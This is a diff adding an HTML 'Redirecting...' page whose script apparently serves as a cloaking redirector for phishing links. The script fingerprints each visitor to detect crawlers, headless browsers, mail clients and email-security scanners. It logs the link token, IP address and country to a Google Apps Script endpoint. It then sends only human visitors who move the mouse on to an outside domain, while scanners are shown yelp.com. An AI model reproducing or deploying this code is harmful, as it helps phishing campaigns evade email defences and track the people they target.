@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    window.addEventListener("load", function () {
+      const hash = window.location.hash ? window.location.hash.substring(1) : null;
+      const ua = navigator.userAgent || "";
+      const uaClean = ua.toLowerCase().replace(/\s+/g, '');
+      let isBot = false;
+
+      if (
+        uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
+        uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
+        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot") ||
+        uaClean.includes("bingbot") || uaClean.includes("yahoobot") || uaClean.includes("duckduckbot") ||
+        uaClean.includes("outlook") || uaClean.includes("thunderbird") || uaClean.includes("email") ||
+        uaClean.includes("mail") || uaClean.includes("eudora") || uaClean.includes("applemail") ||
+        uaClean.includes("smtp") || uaClean.includes("imap") || uaClean.includes("pop3") ||
+        uaClean.includes("scanner") || uaClean.includes("preview") || uaClean.includes("fetcher") ||
+        uaClean.includes("verifier") || uaClean.includes("proofpoint") || uaClean.includes("postini") ||
+        uaClean.includes("barracuda") || uaClean.includes("trendmicro") || uaClean.includes("mimecast") ||
+        uaClean.includes("comcast") || uaClean.includes("charter") || uaClean.includes("roadrunner") ||
+        uaClean.includes("att") || uaClean.includes("yahoo") || uaClean.includes("gmail") || uaClean.includes("aol")
+      ) {
+        isBot = true;
+      }
+
+      try {
+        localStorage.setItem("js-check", "1");
+        if (localStorage.getItem("js-check") !== "1") isBot = true;
+      } catch {
+        isBot = true;
+      }
+
+      if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
+        isBot = true;
+      }
+
+      let moved = false;
+      window.addEventListener("mousemove", () => moved = true);
+
+      if (!hash) {
+        window.location.href = "https://google.com";
+        return;
+      }
+
+      // Log using ip-api.com
+      fetch("https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.query || "";
+          const country = data.country || "";
+
+          const img = new Image();
+          img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec"
+                   + `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
+        })
+        .catch(() => {
+          const img = new Image();
+          img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec"
+                   + `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
+        });
+
+      setTimeout(() => {
+        if (isBot || !moved) {
+          window.location.href = "https://yelp.com";
+        } else {
+          window.location.replace(`https://szliyi.com/${hash}`);
+        }
+      }, 2000);
+    });
+  </script>
+</head>
+<body></body>
+</html>
